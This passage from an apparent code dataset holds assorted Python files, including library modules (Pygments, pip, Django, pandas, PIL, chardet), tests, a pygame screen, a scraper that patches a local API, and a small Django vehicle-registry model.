        ValidationFailure(func=email, ...)

    .. _Django's email validator:
       https://github.com/django/django/blob/master/django/core/validators.py

    .. versionadded:: 0.1

    :param value: value to validate
    :param whitelist: domain names to whitelist

    :copyright: (c) Django Software Foundation and individual contributors.
    :license: BSD
    """"""

    if whitelist is None:
        whitelist = domain_whitelist

    if not value or '@' not in value:
        return False

    user_part, domain_part = value.rsplit('@', 1)

    if not user_regex.match(user_part):
        return False

    if len(user_part.encode(""utf-8"")) > 64:
        return False

    if domain_part not in whitelist and not domain_regex.match(domain_part):
        # Try for possible IDN domain-part
        try:
            domain_part = domain_part.encode('idna').decode('ascii')
            return domain_regex.match(domain_part)
        except UnicodeError:
            return False
    return True"
JY157	JY157-roboconf.py	"""""""
    pygments.lexers.roboconf
    ~~~~~~~~~~~~~~~~~~~~~~~~

    Lexers for Roboconf DSL.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.lexer import RegexLexer, words, re
from pygments.token import Text, Operator, Keyword, Name, Comment

__all__ = ['RoboconfGraphLexer', 'RoboconfInstancesLexer']


class RoboconfGraphLexer(RegexLexer):
    """"""
    Lexer for Roboconf graph files.

    .. versionadded:: 2.1
    """"""
    name = 'Roboconf Graph'
    aliases = ['roboconf-graph']
    filenames = ['*.graph']

    flags = re.IGNORECASE | re.MULTILINE
    tokens = {
        'root': [
            # Skip white spaces
            (r'\s+', Text),

            # There is one operator
            (r'=', Operator),

            # Keywords
            (words(('facet', 'import'), suffix=r'\s*\b', prefix=r'\b'), Keyword),
            (words((
                'installer', 'extends', 'exports', 'imports', 'facets',
                'children'), suffix=r'\s*:?', prefix=r'\b'), Name),

            # Comments
            (r'#.*\n', Comment),

            # Default
            (r'[^#]', Text),
            (r'.*\n', Text)
        ]
    }


class RoboconfInstancesLexer(RegexLexer):
    """"""
    Lexer for Roboconf instances files.

    .. versionadded:: 2.1
    """"""
    name = 'Roboconf Instances'
    aliases = ['roboconf-instances']
    filenames = ['*.instances']

    flags = re.IGNORECASE | re.MULTILINE
    tokens = {
        'root': [

            # Skip white spaces
            (r'\s+', Text),

            # Keywords
            (words(('instance of', 'import'), suffix=r'\s*\b', prefix=r'\b'), Keyword),
            (words(('name', 'count'), suffix=r's*:?', prefix=r'\b'), Name),
            (r'\s*[\w.-]+\s*:', Name),

            # Comments
            (r'#.*\n', Comment),

            # Default
            (r'[^#]', Text),
            (r'.*\n', Text)
        ]
    }"
JD208	JD208-launch_screen.py	"import pygame as pg

class Launch:

    def __init__(self, game):
        self.game = game
        self.screen = game.screen
        self.settings = game.settings
        self.screen_rect = self.screen.get_rect()
        self.images = []
        self.default_color = (255, 255, 255)
        self.prep_strings()
        self.prep_aliens()

    
    def prep_strings(self):
        self.prep_Text(""SPACE"", 170, offsetY=40)
        self.prep_Text(""INVADERS"", 90, color=(0,210,0), offsetY=140)
        self.prep_Text(""= 10 PTS"", 40, offsetX=600, offsetY=300)
        self.prep_Text(""= 20 PTS"", 40, offsetX=600, offsetY=350)
        self.prep_Text(""= 40 PTS"", 40, offsetX=600, offsetY=400)
        self.prep_Text(""= ???"", 40, offsetX=610, offsetY=450)
    
    def prep_aliens(self):
        alien1 = pg.transform.rotozoom(pg.image.load(f'images/alien_03-0.png'), 0, 1.5)
        self.images.append((alien1, (540, 290)))
        alien1 = pg.transform.rotozoom(pg.image.load(f'images/alien__10.png'), 0, .5)
        self.images.append((alien1, (525, 340)))
        alien1 = pg.transform.rotozoom(pg.image.load(f'images/alien__20.png'), 0, .5)
        self.images.append((alien1, (525, 390)))
        alien1 = pg.transform.rotozoom(pg.image.load(f'images/ufo.png'), 0, 1.2)
        self.images.append((alien1, (500, 410)))

    def prep_Text(self, msg, size, color=(255,255,255), offsetX=0, offsetY=0):
        font = pg.font.SysFont(None, size)
        text_image = font.render(msg, True, color, self.settings.bg_color)
        rect = text_image.get_rect()
        if offsetY == 0:
            rect.centery = self.screen_rect.centery
        else:
            rect.top = offsetY
        if offsetX == 0:
            rect.centerx = self.screen_rect.centerx
        else:
            rect.left = offsetX

        self.images.append((text_image,rect))

    def draw(self):
        for image in self.images:
            self.screen.blit(image[0], image[1])"
JY117	JY117-extlib.py	"# This file is part of Scapy
# See http://www.secdev.org/projects/scapy for more information
# Copyright (C) Philippe Biondi <phil@secdev.org>
# This program is published under a GPLv2 license

""""""
External link to programs
""""""

import os
import subprocess
from scapy.error import log_loading

# Notice: this file must not be called before main.py, if started
# in interactive mode, because it needs to be called after the
# logger has been setup, to be able to print the warning messages

# MATPLOTLIB

try:
    from matplotlib import get_backend as matplotlib_get_backend
    from matplotlib import pyplot as plt
    from matplotlib.lines import Line2D
    MATPLOTLIB = 1
    if ""inline"" in matplotlib_get_backend():
        MATPLOTLIB_INLINED = 1
    else:
        MATPLOTLIB_INLINED = 0
    MATPLOTLIB_DEFAULT_PLOT_KARGS = {""marker"": ""+""}
# RuntimeError to catch gtk ""Cannot open display"" error
except (ImportError, RuntimeError):
    plt = None
    Line2D = None
    MATPLOTLIB = 0
    MATPLOTLIB_INLINED = 0
    MATPLOTLIB_DEFAULT_PLOT_KARGS = dict()
    log_loading.info(""Can't import matplotlib. Won't be able to plot."")

# PYX


def _test_pyx():
    # type: () -> bool
    """"""Returns if PyX is correctly installed or not""""""
    try:
        with open(os.devnull, 'wb') as devnull:
            r = subprocess.check_call([""pdflatex"", ""--version""],
                                      stdout=devnull, stderr=subprocess.STDOUT)
    except (subprocess.CalledProcessError, OSError):
        return False
    else:
        return r == 0


try:
    import pyx  # noqa: F401
    if _test_pyx():
        PYX = 1
    else:
        log_loading.info(""PyX dependencies are not installed ! Please install TexLive or MikTeX."")  # noqa: E501
        PYX = 0
except ImportError:
    log_loading.info(""Can't import PyX. Won't be able to use psdump() or pdfdump()."")  # noqa: E501
    PYX = 0"
JD66	JD66-RLDataWebScraper.py	"# extracts the image using a web scraper from the API's image_location
import requests
from bs4 import BeautifulSoup
import time

import json

api_url = 'http://127.0.0.1:3000/items'

# Get the current list of daily items from the API
response = requests.get(api_url)
items = response.json()

updated_count = 0
skipped_count = 0

last_attempted_item = 0

# Go through each item and update the image
for item in items:
    if last_attempted_item is not None and item['id'] < last_attempted_item:
        continue
    while True:
        try:
            img_location = item['image_location']
            img_response = requests.get(img_location)
            img_html = img_response.text
            img_div_start = img_html.find('<div id=""itemSummaryImage"">')
            if img_div_start != -1:
                img_div_end = img_html.find('</div>', img_div_start)
                img_div = img_html[img_div_start:img_div_end+6]
                img_url_start = img_div.find('<img src=""')
                img_url_end = img_div.find('""', img_url_start+10)
                img_url = img_div[img_url_start+10:img_url_end]
                item_data = {'image': img_url, 'valid_status': True}
                patch_response = requests.patch(api_url+'/'+str(item['id']), json=item_data)
                print(f""{item['id']} Image updated"")
                updated_count += 1
            else:
                print(f""{item['id']} No image found"")
                item_data = {'valid_status': False}
                patch_response = requests.patch(api_url+'/'+str(item['id']), json=item_data)
                skipped_count += 1
            last_attempted_item = item['id']
            break
        except Exception as e:
            print(f""Error updating item {item['id']}: {e}"")
            print(f""Retrying in 5 minutes..."")
            time.sleep(5 * 60)

print(f""Updated {updated_count} items"")
print(f""Skipped {skipped_count} items"")"
JY357	JY357-craft.py	"# Copyright (c) 2020 All Rights Reserved
# Author: William H. Guss, Brandon Houghton
from typing import Optional

from minerl.herobraine.hero.handlers.agent.action import Action, ItemListAction
import jinja2
import minerl.herobraine.hero.spaces as spaces


class CraftAction(ItemListAction):
    """"""
    An action handler for crafting items

        Note when used along side Craft Item Nearby, block lists must be disjoint or from_universal will fire multiple
        times

    """"""
    _command = ""craft""

    def to_string(self):
        return ""craft""

    def xml_template(self) -> str:
        return str(""<SimpleCraftCommands/>"")

    def __init__(self, items: list, _other=Optional[str], _default=Optional[str]):
        """"""
        Initializes the space of the handler to be one for each item in the list plus one for the
        default no-craft action (command 0)

        Items are minecraft resource ID's
        """"""
        kwargs = {}
        if _other is not None:
            kwargs['_other'] = _other
        if _default is not None:
            kwargs['_default'] = _default
        super().__init__(
            self._command, items, **kwargs)

    def from_universal(self, obs):
        if 'diff' in obs and 'crafted' in obs['diff'] and len(obs['diff']['crafted']) > 0:
            try:
                x = self._univ_items.index(obs['diff']['crafted'][0]['item'])
                return obs['diff']['crafted'][0]['item'].split('minecraft:')[-1]
            except ValueError:
                return self._default
                # return self._items.index('other')
        else:
            return self._default


class CraftNearbyAction(CraftAction):
    """"""
    An action handler for crafting items when agent is in view of a crafting table

        Note when used along side Craft Item, item lists must be disjoint or from_universal will fire multiple times

    """"""
    _command = ""craftNearby""

    def to_string(self):
        return 'nearbyCraft'

    def xml_template(self) -> str:
        return str(""<NearbyCraftCommands/>"")"
JD43	JD43-egg_link.py	"import os
import re
import sys
from typing import List, Optional

from pip._internal.locations import site_packages, user_site
from pip._internal.utils.virtualenv import (
    running_under_virtualenv,
    virtualenv_no_global,
)

__all__ = [
    ""egg_link_path_from_sys_path"",
    ""egg_link_path_from_location"",
]


def _egg_link_name(raw_name: str) -> str:
    """"""
    Convert a Name metadata value to a .egg-link name, by applying
    the same substitution as pkg_resources's safe_name function.
    Note: we cannot use canonicalize_name because it has a different logic.
    """"""
    return re.sub(""[^A-Za-z0-9.]+"", ""-"", raw_name) + "".egg-link""


def egg_link_path_from_sys_path(raw_name: str) -> Optional[str]:
    """"""
    Look for a .egg-link file for project name, by walking sys.path.
    """"""
    egg_link_name = _egg_link_name(raw_name)
    for path_item in sys.path:
        egg_link = os.path.join(path_item, egg_link_name)
        if os.path.isfile(egg_link):
            return egg_link
    return None


def egg_link_path_from_location(raw_name: str) -> Optional[str]:
    """"""
    Return the path for the .egg-link file if it exists, otherwise, None.

    There's 3 scenarios:
    1) not in a virtualenv
       try to find in site.USER_SITE, then site_packages
    2) in a no-global virtualenv
       try to find in site_packages
    3) in a yes-global virtualenv
       try to find in site_packages, then site.USER_SITE
       (don't look in global location)

    For #1 and #3, there could be odd cases, where there's an egg-link in 2
    locations.

    This method will just return the first one found.
    """"""
    sites: List[str] = []
    if running_under_virtualenv():
        sites.append(site_packages)
        if not virtualenv_no_global() and user_site:
            sites.append(user_site)
    else:
        if user_site:
            sites.append(user_site)
        sites.append(site_packages)

    egg_link_name = _egg_link_name(raw_name)
    for site in sites:
        egglink = os.path.join(site, egg_link_name)
        if os.path.isfile(egglink):
            return egglink
    return None"
JY110	JY110-widont.py	"# -*- coding: utf-8 -*-
import re

from django.template import Library
from django.utils.encoding import force_str


register = Library()
re_widont = re.compile(r'\s+(\S+\s*)$')
re_widont_html = re.compile(r'([^<>\s])\s+([^<>\s]+\s*)(</?(?:address|blockquote|br|dd|div|dt|fieldset|form|h[1-6]|li|noscript|p|td|th)[^>]*>|$)', re.IGNORECASE)


@register.filter
def widont(value, count=1):
    """"""
    Add an HTML non-breaking space between the final two words of the string to
    avoid ""widowed"" words.

    Examples:

    >>> print(widont('Test   me   out'))
    Test   me&nbsp;out

    >>> print(""'"",widont('It works with trailing spaces too  '), ""'"")
    ' It works with trailing spaces&nbsp;too   '

    >>> print(widont('NoEffect'))
    NoEffect
    """"""
    def replace(matchobj):
        return force_str('&nbsp;%s' % matchobj.group(1))
    for i in range(count):
        value = re_widont.sub(replace, force_str(value))
    return value


@register.filter
def widont_html(value):
    """"""
    Add an HTML non-breaking space between the final two words at the end of
    (and in sentences just outside of) block level tags to avoid ""widowed""
    words.

    Examples:

    >>> print(widont_html('<h2>Here is a simple  example  </h2> <p>Single</p>'))
    <h2>Here is a simple&nbsp;example  </h2> <p>Single</p>

    >>> print(widont_html('<p>test me<br /> out</p><h2>Ok?</h2>Not in a p<p title=""test me"">and this</p>'))
    <p>test&nbsp;me<br /> out</p><h2>Ok?</h2>Not in a&nbsp;p<p title=""test me"">and&nbsp;this</p>

    >>> print(widont_html('leading text  <p>test me out</p>  trailing text'))
    leading&nbsp;text  <p>test me&nbsp;out</p>  trailing&nbsp;text
    """"""
    def replace(matchobj):
        return force_str('%s&nbsp;%s%s' % matchobj.groups())
    return re_widont_html.sub(replace, force_str(value))


if __name__ == ""__main__"":
    def _test():
        import doctest
        doctest.testmod()
    _test()"
JY89	JY89-context_processors.py	"# PermWrapper and PermLookupDict proxy the permissions system into objects that
# the template system can understand.


class PermLookupDict:
    def __init__(self, user, app_label):
        self.user, self.app_label = user, app_label

    def __repr__(self):
        return str(self.user.get_all_permissions())

    def __getitem__(self, perm_name):
        return self.user.has_perm(""%s.%s"" % (self.app_label, perm_name))

    def __iter__(self):
        # To fix 'item in perms.someapp' and __getitem__ interaction we need to
        # define __iter__. See #18979 for details.
        raise TypeError(""PermLookupDict is not iterable."")

    def __bool__(self):
        return self.user.has_module_perms(self.app_label)


class PermWrapper:
    def __init__(self, user):
        self.user = user

    def __getitem__(self, app_label):
        return PermLookupDict(self.user, app_label)

    def __iter__(self):
        # I am large, I contain multitudes.
        raise TypeError(""PermWrapper is not iterable."")

    def __contains__(self, perm_name):
        """"""
        Lookup by ""someapp"" or ""someapp.someperm"" in perms.
        """"""
        if '.' not in perm_name:
            # The name refers to module.
            return bool(self[perm_name])
        app_label, perm_name = perm_name.split('.', 1)
        return self[app_label][perm_name]


def auth(request):
    """"""
    Return context variables required by apps that use Django's authentication
    system.

    If there is no 'user' attribute in the request, use AnonymousUser (from
    django.contrib.auth).
    """"""
    if hasattr(request, 'user'):
        user = request.user
    else:
        from django.contrib.auth.models import AnonymousUser
        user = AnonymousUser()

    return {
        'user': user,
        'perms': PermWrapper(user),
    }"
JY126	JY126-ogrinfo.py	"""""""
This module includes some utility functions for inspecting the layout
of a GDAL data source -- the functionality is analogous to the output
produced by the `ogrinfo` utility.
""""""

from django.contrib.gis.gdal import DataSource
from django.contrib.gis.gdal.geometries import GEO_CLASSES


def ogrinfo(data_source, num_features=10):
    """"""
    Walk the available layers in the supplied `data_source`, displaying
    the fields for the first `num_features` features.
    """"""

    # Checking the parameters.
    if isinstance(data_source, str):
        data_source = DataSource(data_source)
    elif isinstance(data_source, DataSource):
        pass
    else:
        raise Exception(
            ""Data source parameter must be a string or a DataSource object.""
        )

    for i, layer in enumerate(data_source):
        print(""data source : %s"" % data_source.name)
        print(""==== layer %s"" % i)
        print(""  shape type: %s"" % GEO_CLASSES[layer.geom_type.num].__name__)
        print(""  # features: %s"" % len(layer))
        print(""         srs: %s"" % layer.srs)
        extent_tup = layer.extent.tuple
        print(""      extent: %s - %s"" % (extent_tup[0:2], extent_tup[2:4]))
        print(""Displaying the first %s features ===="" % num_features)

        width = max(*map(len, layer.fields))
        fmt = "" %%%ss: %%s"" % width
        for j, feature in enumerate(layer[:num_features]):
            print(""=== Feature %s"" % j)
            for fld_name in layer.fields:
                type_name = feature[fld_name].type_name
                output = fmt % (fld_name, type_name)
                val = feature.get(fld_name)
                if val:
                    if isinstance(val, str):
                        val_fmt = ' (""%s"")'
                    else:
                        val_fmt = "" (%s)""
                    output += val_fmt % val
                else:
                    output += "" (None)""
                print(output)"
JY496	JY496-mbcsgroupprober.py	"######################## BEGIN LICENSE BLOCK ########################
# The Original Code is Mozilla Universal charset detector code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 2001
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#   Shy Shalom - original C code
#   Proofpoint, Inc.
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .big5prober import Big5Prober
from .charsetgroupprober import CharSetGroupProber
from .cp949prober import CP949Prober
from .eucjpprober import EUCJPProber
from .euckrprober import EUCKRProber
from .euctwprober import EUCTWProber
from .gb2312prober import GB2312Prober
from .johabprober import JOHABProber
from .sjisprober import SJISProber
from .utf8prober import UTF8Prober


class MBCSGroupProber(CharSetGroupProber):
    def __init__(self, lang_filter=None):
        super().__init__(lang_filter=lang_filter)
        self.probers = [
            UTF8Prober(),
            SJISProber(),
            EUCJPProber(),
            GB2312Prober(),
            EUCKRProber(),
            CP949Prober(),
            Big5Prober(),
            EUCTWProber(),
            JOHABProber(),
        ]
        self.reset()"
JY492	JY492-ImageSequence.py	"#
# The Python Imaging Library.
# $Id$
#
# sequence support classes
#
# history:
# 1997-02-20 fl     Created
#
# Copyright (c) 1997 by Secret Labs AB.
# Copyright (c) 1997 by Fredrik Lundh.
#
# See the README file for information on usage and redistribution.
#

##


class Iterator:
    """"""
    This class implements an iterator object that can be used to loop
    over an image sequence.

    You can use the ``[]`` operator to access elements by index. This operator
    will raise an :py:exc:`IndexError` if you try to access a nonexistent
    frame.

    :param im: An image object.
    """"""

    def __init__(self, im):
        if not hasattr(im, ""seek""):
            msg = ""im must have seek method""
            raise AttributeError(msg)
        self.im = im
        self.position = getattr(self.im, ""_min_frame"", 0)

    def __getitem__(self, ix):
        try:
            self.im.seek(ix)
            return self.im
        except EOFError as e:
            raise IndexError from e  # end of sequence

    def __iter__(self):
        return self

    def __next__(self):
        try:
            self.im.seek(self.position)
            self.position += 1
            return self.im
        except EOFError as e:
            raise StopIteration from e


def all_frames(im, func=None):
    """"""
    Applies a given function to all frames in an image or a list of images.
    The frames are returned as a list of separate images.

    :param im: An image, or a list of images.
    :param func: The function to apply to all of the image frames.
    :returns: A list of images.
    """"""
    if not isinstance(im, list):
        im = [im]

    ims = []
    for imSequence in im:
        current = imSequence.tell()

        ims += [im_frame.copy() for im_frame in Iterator(imSequence)]

        imSequence.seek(current)
    return [func(im) for im in ims] if func else ims"
JD368	JD368-conftest.py	"# Copyright 2022 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import os
import re
import uuid

from google.cloud import iam_v2
from google.cloud.iam_v2 import types
import pytest
from snippets.create_deny_policy import create_deny_policy
from snippets.delete_deny_policy import delete_deny_policy

PROJECT_ID = os.environ[""IAM_PROJECT_ID""]
GOOGLE_APPLICATION_CREDENTIALS = os.environ[""IAM_CREDENTIALS""]


@pytest.fixture
def deny_policy(capsys: ""pytest.CaptureFixture[str]"") -> None:
    policy_id = f""test-deny-policy-{uuid.uuid4()}""

    # Delete any existing policies. Otherwise it might throw quota issue.
    delete_existing_deny_policies(PROJECT_ID, ""test-deny-policy"")

    # Create the Deny policy.
    create_deny_policy(PROJECT_ID, policy_id)

    yield policy_id

    # Delete the Deny policy and assert if deleted.
    delete_deny_policy(PROJECT_ID, policy_id)
    out, _ = capsys.readouterr()
    assert re.search(f""Deleted the deny policy: {policy_id}"", out)


def delete_existing_deny_policies(project_id: str, delete_name_prefix: str) -> None:
    policies_client = iam_v2.PoliciesClient()

    attachment_point = f""cloudresourcemanager.googleapis.com%2Fprojects%2F{project_id}""

    request = types.ListPoliciesRequest()
    request.parent = f""policies/{attachment_point}/denypolicies""
    for policy in policies_client.list_policies(request=request):
        if delete_name_prefix in policy.name:
            delete_deny_policy(PROJECT_ID, str(policy.name).rsplit(""/"", 1)[-1])"
JY554	JY554-test_to_string.py	"from textwrap import dedent

import pytest

from pandas import DataFrame

pytest.importorskip(""jinja2"")
from pandas.io.formats.style import Styler


@pytest.fixture
def df():
    return DataFrame({""A"": [0, 1], ""B"": [-0.61, -1.22], ""C"": [""ab"", ""cd""]})


@pytest.fixture
def styler(df):
    return Styler(df, uuid_len=0, precision=2)


def test_basic_string(styler):
    result = styler.to_string()
    expected = dedent(
        """"""\
     A B C
    0 0 -0.61 ab
    1 1 -1.22 cd
    """"""
    )
    assert result == expected


def test_string_delimiter(styler):
    result = styler.to_string(delimiter="";"")
    expected = dedent(
        """"""\
    ;A;B;C
    0;0;-0.61;ab
    1;1;-1.22;cd
    """"""
    )
    assert result == expected


def test_concat(styler):
    result = styler.concat(styler.data.agg([""sum""]).style).to_string()
    expected = dedent(
        """"""\
     A B C
    0 0 -0.61 ab
    1 1 -1.22 cd
    sum 1 -1.830000 abcd
    """"""
    )
    assert result == expected


def test_concat_recursion(styler):
    df = styler.data
    styler1 = styler
    styler2 = Styler(df.agg([""sum""]), uuid_len=0, precision=3)
    styler3 = Styler(df.agg([""sum""]), uuid_len=0, precision=4)
    result = styler1.concat(styler2.concat(styler3)).to_string()
    expected = dedent(
        """"""\
     A B C
    0 0 -0.61 ab
    1 1 -1.22 cd
    sum 1 -1.830 abcd
    sum 1 -1.8300 abcd
    """"""
    )
    assert result == expected


def test_concat_chain(styler):
    df = styler.data
    styler1 = styler
    styler2 = Styler(df.agg([""sum""]), uuid_len=0, precision=3)
    styler3 = Styler(df.agg([""sum""]), uuid_len=0, precision=4)
    result = styler1.concat(styler2).concat(styler3).to_string()
    expected = dedent(
        """"""\
     A B C
    0 0 -0.61 ab
    1 1 -1.22 cd
    sum 1 -1.830 abcd
    sum 1 -1.8300 abcd
    """"""
    )
    assert result == expected"
JD224	JD224-TestStringIOTree.py	"import unittest

from Cython import StringIOTree as stringtree

code = """"""
cdef int spam                   # line 1

cdef ham():
    a = 1
    b = 2
    c = 3
    d = 4

def eggs():
    pass

cpdef bacon():
    print spam
    print 'scotch'
    print 'tea?'
    print 'or coffee?'          # line 16
""""""

linemap = dict(enumerate(code.splitlines()))

class TestStringIOTree(unittest.TestCase):

    def setUp(self):
        self.tree = stringtree.StringIOTree()

    def test_markers(self):
        assert not self.tree.allmarkers()

    def test_insertion(self):
        self.write_lines((1, 2, 3))
        line_4_to_6_insertion_point = self.tree.insertion_point()
        self.write_lines((7, 8))
        line_9_to_13_insertion_point = self.tree.insertion_point()
        self.write_lines((14, 15, 16))

        line_4_insertion_point = line_4_to_6_insertion_point.insertion_point()
        self.write_lines((5, 6), tree=line_4_to_6_insertion_point)

        line_9_to_12_insertion_point = (
            line_9_to_13_insertion_point.insertion_point())
        self.write_line(13, tree=line_9_to_13_insertion_point)

        self.write_line(4, tree=line_4_insertion_point)
        self.write_line(9, tree=line_9_to_12_insertion_point)
        line_10_insertion_point = line_9_to_12_insertion_point.insertion_point()
        self.write_line(11, tree=line_9_to_12_insertion_point)
        self.write_line(10, tree=line_10_insertion_point)
        self.write_line(12, tree=line_9_to_12_insertion_point)

        self.assertEqual(self.tree.allmarkers(), list(range(1, 17)))
        self.assertEqual(code.strip(), self.tree.getvalue().strip())


    def write_lines(self, linenos, tree=None):
        for lineno in linenos:
            self.write_line(lineno, tree=tree)

    def write_line(self, lineno, tree=None):
        if tree is None:
            tree = self.tree
        tree.markers.append(lineno)
        tree.write(linemap[lineno] + '\n')"
JY241	JY241-python_parser.py	"# Copyright (c) Meta Platforms, Inc. and affiliates.
#
# This source code is licensed under the MIT license found in the
# LICENSE file in the root directory of this source tree.
# pyre-unsafe

from typing import Any, Iterable, Mapping, Sequence

from viktor._vendor.libcst._parser.base_parser import BaseParser
from viktor._vendor.libcst._parser.grammar import get_nonterminal_conversions, get_terminal_conversions
from viktor._vendor.libcst._parser.parso.pgen2.generator import Grammar
from viktor._vendor.libcst._parser.parso.python.token import TokenType
from viktor._vendor.libcst._parser.types.config import ParserConfig
from viktor._vendor.libcst._parser.types.conversions import NonterminalConversion, TerminalConversion
from viktor._vendor.libcst._parser.types.token import Token


class PythonCSTParser(BaseParser[Token, TokenType, Any]):
    config: ParserConfig
    terminal_conversions: Mapping[str, TerminalConversion]
    nonterminal_conversions: Mapping[str, NonterminalConversion]

    def __init__(
        self,
        *,
        tokens: Iterable[Token],
        config: ParserConfig,
        pgen_grammar: ""Grammar[TokenType]"",
        start_nonterminal: str = ""file_input"",
    ) -> None:
        super().__init__(
            tokens=tokens,
            lines=config.lines,
            pgen_grammar=pgen_grammar,
            start_nonterminal=start_nonterminal,
        )
        self.config = config
        self.terminal_conversions = get_terminal_conversions()
        self.nonterminal_conversions = get_nonterminal_conversions(
            config.version, config.future_imports
        )

    def convert_nonterminal(self, nonterminal: str, children: Sequence[Any]) -> Any:
        return self.nonterminal_conversions[nonterminal](self.config, children)

    def convert_terminal(self, token: Token) -> Any:
        return self.terminal_conversions[token.type.name](self.config, token)"
JD499	JD499-models.py	"from django.db import models

# Create your models here.
class RTOadmin(models.Model):
    admin_id=models.AutoField(primary_key = True)
    admin_username=models.CharField(max_length=50)
    # authentication/forms.py
    admin_password = models.CharField(max_length=50)
    # desc=models.CharField(max_length=300)
    admin_created_date=models.DateField(auto_now_add=True)

    def __str__(self):
        return self.admin_username
    
class Vehicle(models.Model): 
    vehicle_id=models.AutoField(primary_key = True)
    vehicle_no=models.CharField(max_length=50,default=None)
    vehicle_own_name = models.CharField(max_length=50,default=None)
    vehicle_own_contact=models.IntegerField(default=None)
    vehicle_own_add=models.CharField(max_length=100,default=None)
    vehicle_own_email=models.CharField(max_length=50, default=None)
    vehicle_company_name=models.CharField(max_length=50,default=None)
    # vehicle_class=models.CharField(max_length=50,default=None)
    vehicle_date_reg=models.DateField(default=None)
    vehicle_chassics_no=models.CharField(max_length=30,default=None)
    vehicle_eng_no=models.CharField(max_length=30,default=None)
    vehicle_own_srno=models.IntegerField(default=None)
    vehicle_fuel_use=models.CharField(max_length=30,default=None)
    vehicle_Seat_cap=models.IntegerField(default=None)
    vehicle_model_name=models.CharField(max_length=50,default=None)
    vehicle_created_date=models.DateField(auto_now_add=True)  
    vehicle_last_login=models.CharField(max_length=30,default=None)

    def __str__(self):  
        return self.vehicle_no

class Rules(models.Model):
    rule_id=models.AutoField(primary_key= True)
    rule_code=models.CharField(max_length=50)
    rule_desc=models.CharField(max_length=100,blank=True)
    rule_sect = models.CharField(max_length=50,null=True)
    rule_pen=models.CharField(max_length=100,null=True)
    # rule_date=models.DateField(default=None)
    def __str__(self):  
        return self.rule_code"
JY442	JY442-Test_SEC_TI_COMMANDS.py	"from enocean.protocol.packet import RadioPacket, ChainedMSG, Packet, MSGChainer, SECTeachInPacket
from enocean.protocol import security
import enocean.utils
from enocean.communicators.serialcommunicator import SerialCommunicator
from enocean.protocol.constants import PACKET, RORG

try:
    import queue
except ImportError:
    import Queue as queue

SECTI = SECTeachInPacket.create_SECTI_chain(SLF=0x8B, destination=[0x05,0x06,0x06,0x05])

Dat_send = enocean.utils.from_hex_string(""8F:00:00:00:15:E0"")
Raw1664=RadioPacket.create_raw(rorg=RORG.VLD, Raw_Data=Dat_send, destination = [0x05, 0x03, 0x06, 0x1B])

print(enocean.utils.to_hex_string(SECTI[1].build()))
print(enocean.utils.to_hex_string(SECTI[1].SLF))
print(enocean.utils.to_hex_string(SECTI[1].RLC))
print(enocean.utils.to_hex_string(SECTI[1].KEY))

for packet in SECTI[0]:
    print(enocean.utils.to_hex_string(packet.build()))
    print(packet.IDX,"":"", packet.CNT,"":"",packet.PSK,"":"",packet.TYPE,"":"",packet.INFO)

# communicator = SerialCommunicator(port=u'COM4')
# communicator.start()
# print('The Base ID of your module is %s.' % enocean.utils.to_hex_string(communicator.base_id))

# communicator.send_list(SECTI)

# # for p in SECTI:
# #     communicator.send(p)
# #     print(enocean.utils.to_hex_string(p.build()))

# while communicator.is_alive():
#             try:
#                 packet = communicator.receive.get(block=True, timeout=0.1)
#                 # We're only interested in responses to the request in question.
#                 if packet.packet_type == PACKET.RESPONSE:
#                     print(enocean.utils.to_hex_string(packet.build()))
#                 # Put other packets back to the Queue.
#             except queue.Empty:
#                 continue
#             except KeyboardInterrupt:
#                 break
#             except Exception:
#                 break


# if communicator.is_alive():
#     communicator.stop()
"
JY455	JY455-test_bin_groupby.py	"import numpy as np
import pytest

from pandas._libs import lib
import pandas.util._test_decorators as td

import pandas as pd
import pandas._testing as tm


def assert_block_lengths(x):
    assert len(x) == len(x._mgr.blocks[0].mgr_locs)
    return 0


def cumsum_max(x):
    x.cumsum().max()
    return 0


@pytest.mark.parametrize(
    ""func"",
    [
        cumsum_max,
        pytest.param(assert_block_lengths, marks=td.skip_array_manager_invalid_test),
    ],
)
def test_mgr_locs_updated(func):
    # https://github.com/pandas-dev/pandas/issues/31802
    # Some operations may require creating new blocks, which requires
    # valid mgr_locs
    df = pd.DataFrame({""A"": [""a"", ""a"", ""a""], ""B"": [""a"", ""b"", ""b""], ""C"": [1, 1, 1]})
    result = df.groupby([""A"", ""B""]).agg(func)
    expected = pd.DataFrame(
        {""C"": [0, 0]},
        index=pd.MultiIndex.from_product([[""a""], [""a"", ""b""]], names=[""A"", ""B""]),
    )
    tm.assert_frame_equal(result, expected)


@pytest.mark.parametrize(
    ""binner,closed,expected"",
    [
        (
            np.array([0, 3, 6, 9], dtype=np.int64),
            ""left"",
            np.array([2, 5, 6], dtype=np.int64),
        ),
        (
            np.array([0, 3, 6, 9], dtype=np.int64),
            ""right"",
            np.array([3, 6, 6], dtype=np.int64),
        ),
        (np.array([0, 3, 6], dtype=np.int64), ""left"", np.array([2, 5], dtype=np.int64)),
        (
            np.array([0, 3, 6], dtype=np.int64),
            ""right"",
            np.array([3, 6], dtype=np.int64),
        ),
    ],
)
def test_generate_bins(binner, closed, expected):
    values = np.array([1, 2, 3, 4, 5, 6], dtype=np.int64)
    result = lib.generate_bins_dt64(values, binner, closed=closed)
    tm.assert_numpy_array_equal(result, expected)

